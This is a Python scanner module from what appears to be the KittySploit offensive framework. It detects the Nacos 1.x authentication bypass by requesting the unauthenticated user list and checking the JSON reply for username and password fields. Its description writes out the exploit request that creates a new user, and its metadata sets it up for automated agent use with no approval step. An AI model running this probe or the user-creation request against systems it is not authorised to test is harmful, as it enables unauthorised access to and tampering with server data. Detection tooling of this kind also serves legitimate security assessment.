#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nacos 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nacos 1.x - Authentication Bypass Detection',
        'description': 'Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'nacos', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/alibaba/nacos/issues/4593',
            'https://nacos.io/en-us/docs/auth.html',
            'https://zhuanlan.zhihu.com/p/602021283',
        ],
    }

    def run(self):
        for path in ('/nacos/v1/auth/users?pageNo=1&pageSize=9', '/v1/auth/users?pageNo=1&pageSize=9'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('"totalCount":', '"username":', '"password":', '"pagesAvailable":',)
            header_any = ('application/json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='critical',
                    reason="Nacos 1.x - Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

